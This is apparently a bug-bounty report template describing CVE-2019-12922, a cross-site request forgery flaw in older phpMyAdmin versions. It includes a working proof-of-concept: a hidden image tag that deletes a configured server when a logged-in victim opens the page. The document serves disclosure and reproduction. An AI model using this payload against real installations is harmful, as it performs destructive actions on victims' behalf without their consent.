
# PhpMyAdmin instance vulnerable to CVE-2019-12922

## Summary
The vulnerability (**[CVE-2019-12922](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12922)**) exists due to insufficient validation of the HTTP request origin. A remote attacker can trick the victim to visit a specially crafted web page and perform arbitrary actions on behalf of the victim on the vulnerable website, such as delete an arbitrary server on the Setup page.

Installed version $VERSION (check screenshot) which is vulnerable (phpMyAdmin <= 4.9.0.1)  

$SCREENSHOTS

## Steps To Reproduce

PhpMyAdmin endpoint 

$URL 

Create a HTML file with the following content (this could be also just a link):
```
<p>Deleting Server 1</p>
<img src="
$URL/index.php?page=servers&mode=remove&id=1"
style="display:none;" />
```

An attacker can create a CSRF HTML page using the above HTML code, and when the victim visits any such page. Then an server will be deleted with id=1

Notice that the POC was included on nvd.nist.gov web sites, it's not theoretical it's a working POC


## Impact
An attacker can perform arbitrary actions on behalf of the victim, such as execute arbitrary INSERT or DELETE statements, delete an arbitrary server on the Setup page.

 
### Supporting Material/References
* https://hackerone.com/reports/1113212
* https://nvd.nist.gov/vuln/detail/CVE-2019-12922
* **Exploit** https://www.exploit-db.com/exploits/47385

